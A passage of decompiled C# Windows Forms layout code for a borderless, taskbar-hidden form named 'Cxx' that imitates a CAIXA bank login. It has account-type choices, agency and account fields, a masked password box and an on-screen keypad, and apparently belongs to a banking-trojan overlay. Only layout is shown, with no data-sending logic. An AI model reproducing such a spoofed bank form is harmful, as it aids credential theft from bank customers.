		((Control)label44).set_Cursor(Cursors.get_Hand());
		((Control)label44).set_Location(new Point(485, 234));
		((Control)label44).set_Margin(new Padding(0));
		((Control)label44).set_Name("label44");
		((Control)label44).set_Size(new Size(15, 13));
		((Control)label44).set_TabIndex(23);
		((Control)label44).add_Click((EventHandler)label44_Click_1);
		((Control)label67).set_BackColor(Color.Transparent);
		((Control)label67).set_Cursor(Cursors.get_Hand());
		((Control)label67).set_Location(new Point(504, 234));
		((Control)label67).set_Margin(new Padding(0));
		((Control)label67).set_Name("label67");
		((Control)label67).set_Size(new Size(15, 13));
		((Control)label67).set_TabIndex(22);
		((Control)label67).add_Click((EventHandler)label67_Click_1);
		((Control)label68).set_BackColor(Color.Transparent);
		((Control)label68).set_Cursor(Cursors.get_Hand());
		((Control)label68).set_Location(new Point(464, 234));
		((Control)label68).set_Margin(new Padding(0));
		((Control)label68).set_Name("label68");
		((Control)label68).set_Size(new Size(15, 13));
		((Control)label68).set_TabIndex(19);
		((Control)label68).add_Click((EventHandler)label68_Click_1);
		((Control)label69).set_BackColor(Color.Transparent);
		((Control)label69).set_Cursor(Cursors.get_Hand());
		((Control)label69).set_Location(new Point(384, 234));
		((Control)label69).set_Margin(new Padding(0));
		((Control)label69).set_Name("label69");
		((Control)label69).set_Size(new Size(15, 13));
		((Control)label69).set_TabIndex(20);
		((Control)label69).add_Click((EventHandler)label69_Click_1);
		((Control)label70).set_BackColor(Color.Transparent);
		((Control)label70).set_Cursor(Cursors.get_Hand());
		((Control)label70).set_Location(new Point(444, 234));
		((Control)label70).set_Margin(new Padding(0));
		((Control)label70).set_Name("label70");
		((Control)label70).set_Size(new Size(15, 13));
		((Control)label70).set_TabIndex(21);
		((Control)label70).add_Click((EventHandler)label70_Click_1);
		((Control)label71).set_BackColor(Color.Transparent);
		((Control)label71).set_Cursor(Cursors.get_Hand());
		((Control)label71).set_Location(new Point(424, 234));
		((Control)label71).set_Margin(new Padding(0));
		((Control)label71).set_Name("label71");
		((Control)label71).set_Size(new Size(15, 13));
		((Control)label71).set_TabIndex(15);
		((Control)label71).add_Click((EventHandler)label71_Click_1);
		((Control)label72).set_BackColor(Color.Transparent);
		((Control)label72).set_Cursor(Cursors.get_Hand());
		((Control)label72).set_Location(new Point(364, 234));
		((Control)label72).set_Margin(new Padding(0));
		((Control)label72).set_Name("label72");
		((Control)label72).set_Size(new Size(15, 13));
		((Control)label72).set_TabIndex(14);
		((Control)label72).add_Click((EventHandler)label72_Click_1);
		((Control)label73).set_BackColor(Color.Transparent);
		((Control)label73).set_Cursor(Cursors.get_Hand());
		((Control)label73).set_Location(new Point(404, 234));
		((Control)label73).set_Margin(new Padding(0));
		((Control)label73).set_Name("label73");
		((Control)label73).set_Size(new Size(15, 13));
		((Control)label73).set_TabIndex(16);
		((Control)label73).add_Click((EventHandler)label73_Click_1);
		((Control)label74).set_BackColor(Color.Transparent);
		((Control)label74).set_Cursor(Cursors.get_Hand());
		((Control)label74).set_Location(new Point(344, 234));
		((Control)label74).set_Margin(new Padding(0));
		((Control)label74).set_Name("label74");
		((Control)label74).set_Size(new Size(15, 13));
		((Control)label74).set_TabIndex(18);
		((Control)label74).add_Click((EventHandler)label74_Click_1);
		((Control)label75).set_BackColor(Color.Transparent);
		((Control)label75).set_Cursor(Cursors.get_Hand());
		((Control)label75).set_Location(new Point(324, 234));
		((Control)label75).set_Margin(new Padding(0));
		((Control)label75).set_Name("label75");
		((Control)label75).set_Size(new Size(15, 13));
		((Control)label75).set_TabIndex(17);
		((Control)label75).add_Click((EventHandler)label75_Click_1);
		((Control)f_4).set_BackColor(Color.White);
		((Control)f_4).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)f_4).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)f_4).set_Location(new Point(129, 201));
		((Control)f_4).set_Margin(new Padding(0));
		((TextBoxBase)f_4).set_MaxLength(11);
		((Control)f_4).set_Name("f_4");
		f_4.set_PasswordChar('•');
		((TextBoxBase)f_4).set_ReadOnly(true);
		((Control)f_4).set_Size(new Size(33, 21));
		((Control)f_4).set_TabIndex(5);
		((Control)label56).set_BackColor(Color.Transparent);
		((Control)label56).set_Cursor(Cursors.get_Hand());
		((Control)label56).set_Location(new Point(191, 257));
		((Control)label56).set_Name("label56");
		((Control)label56).set_Size(new Size(71, 14));
		((Control)label56).set_TabIndex(4);
		((Control)label56).add_Click((EventHandler)label56_Click);
		((Control)label55).set_BackColor(Color.Transparent);
		((Control)label55).set_Cursor(Cursors.get_Hand());
		((Control)label55).set_Location(new Point(94, 256));
		((Control)label55).set_Name("label55");
		((Control)label55).set_Size(new Size(87, 14));
		((Control)label55).set_TabIndex(3);
		((Control)label54).set_BackColor(Color.Transparent);
		((Control)label54).set_Cursor(Cursors.get_Hand());
		((Control)label54).set_Location(new Point(19, 257));
		((Control)label54).set_Name("label54");
		((Control)label54).set_Size(new Size(67, 14));
		((Control)label54).set_TabIndex(3);
		((Control)label53).set_BackColor(Color.Transparent);
		((Control)label53).set_Cursor(Cursors.get_Hand());
		((Control)label53).set_Location(new Point(504, 234));
		((Control)label53).set_Name("label53");
		((Control)label53).set_Size(new Size(14, 14));
		((Control)label53).set_TabIndex(2);
		((Control)label51).set_BackColor(Color.Transparent);
		((Control)label51).set_Cursor(Cursors.get_Hand());
		((Control)label51).set_Location(new Point(464, 234));
		((Control)label51).set_Name("label51");
		((Control)label51).set_Size(new Size(14, 14));
		((Control)label51).set_TabIndex(2);
		((Control)label49).set_BackColor(Color.Transparent);
		((Control)label49).set_Cursor(Cursors.get_Hand());
		((Control)label49).set_Location(new Point(424, 234));
		((Control)label49).set_Name("label49");
		((Control)label49).set_Size(new Size(14, 14));
		((Control)label49).set_TabIndex(2);
		((Control)label47).set_BackColor(Color.Transparent);
		((Control)label47).set_Cursor(Cursors.get_Hand());
		((Control)label47).set_Location(new Point(384, 234));
		((Control)label47).set_Name("label47");
		((Control)label47).set_Size(new Size(14, 14));
		((Control)label47).set_TabIndex(2);
		((Control)label45).set_BackColor(Color.Transparent);
		((Control)label45).set_Cursor(Cursors.get_Hand());
		((Control)label45).set_Location(new Point(344, 234));
		((Control)label45).set_Name("label45");
		((Control)label45).set_Size(new Size(14, 14));
		((Control)label45).set_TabIndex(2);
		((Control)label52).set_BackColor(Color.Transparent);
		((Control)label52).set_Cursor(Cursors.get_Hand());
		((Control)label52).set_Location(new Point(484, 234));
		((Control)label52).set_Name("label52");
		((Control)label52).set_Size(new Size(14, 14));
		((Control)label52).set_TabIndex(2);
		((Control)label50).set_BackColor(Color.Transparent);
		((Control)label50).set_Cursor(Cursors.get_Hand());
		((Control)label50).set_Location(new Point(444, 234));
		((Control)label50).set_Name("label50");
		((Control)label50).set_Size(new Size(14, 14));
		((Control)label50).set_TabIndex(2);
		((Control)label48).set_BackColor(Color.Transparent);
		((Control)label48).set_Cursor(Cursors.get_Hand());
		((Control)label48).set_Location(new Point(404, 234));
		((Control)label48).set_Name("label48");
		((Control)label48).set_Size(new Size(14, 14));
		((Control)label48).set_TabIndex(2);
		((Control)label46).set_BackColor(Color.Transparent);
		((Control)label46).set_Cursor(Cursors.get_Hand());
		((Control)label46).set_Location(new Point(364, 234));
		((Control)label46).set_Name("label46");
		((Control)label46).set_Size(new Size(14, 14));
		((Control)label46).set_TabIndex(2);
		((Control)ComboTipoBox).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ComboTipoBox).set_ForeColor(Color.FromArgb(64, 64, 64));
		((ListControl)ComboTipoBox).set_FormattingEnabled(true);
		ComboTipoBox.get_Items().AddRange(new object[12]
		{
			"001 - Conta Corrente - P.Física", "002 - Conta Simples - P.Física", "003 - Conta Corrente - P.Jurídica", "006 - Entidades Públicas", "007 - Dep. Instituições Financeiras", "013 - Poupança - Pessoa Física", "022 - Poupança - Pessoa Jurídica", "023 - Conta CAIXA Fácil", "028 - Poupança Crédito Imobiliário", "032 - Conta Investimento - P.Física",
			"034 - Conta Investimento - P.Jurídica", "043 - Depósitos Lotéricos"
		});
		((Control)ComboTipoBox).set_Location(new Point(129, 73));
		((Control)ComboTipoBox).set_Name("ComboTipoBox");
		((Control)ComboTipoBox).set_Size(new Size(257, 21));
		((Control)ComboTipoBox).set_TabIndex(0);
		((Control)ComboTipoBox).set_Text("001 - Conta Corrente - Pessoa Física");
		((Control)f_c).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)f_c).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)f_c).set_Location(new Point(129, 163));
		((TextBoxBase)f_c).set_MaxLength(11);
		((Control)f_c).set_Name("f_c");
		((Control)f_c).set_Size(new Size(120, 21));
		((Control)f_c).set_TabIndex(4);
		((Control)f_c).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)f_n).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)f_n).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)f_n).set_Location(new Point(129, 143));
		((TextBoxBase)f_n).set_MaxLength(40);
		((Control)f_n).set_Name("f_n");
		((Control)f_n).set_Size(new Size(237, 21));
		((Control)f_n).set_TabIndex(3);
		((Control)f_b).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)f_b).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)f_b).set_Location(new Point(129, 115));
		((Control)f_b).set_Margin(new Padding(0));
		((TextBoxBase)f_b).set_MaxLength(12);
		((Control)f_b).set_Name("f_b");
		((Control)f_b).set_Size(new Size(107, 21));
		((Control)f_b).set_TabIndex(2);
		((Control)f_b).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)f_a).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)f_a).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)f_a).set_Location(new Point(129, 94));
		((Control)f_a).set_Margin(new Padding(0));
		((TextBoxBase)f_a).set_MaxLength(4);
		((Control)f_a).set_Name("f_a");
		((Control)f_a).set_Size(new Size(60, 21));
		((Control)f_a).set_TabIndex(1);
		((Control)f_a).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(756, 347));
		((Control)this).get_Controls().Add((Control)(object)panel3);
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Cxx");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Cxx");
		((Control)panel2).ResumeLayout(false);
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)panel3).ResumeLayout(false);
		((Control)panel3).PerformLayout();
		((Control)panel4).ResumeLayout(false);
		((Control)panel4).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
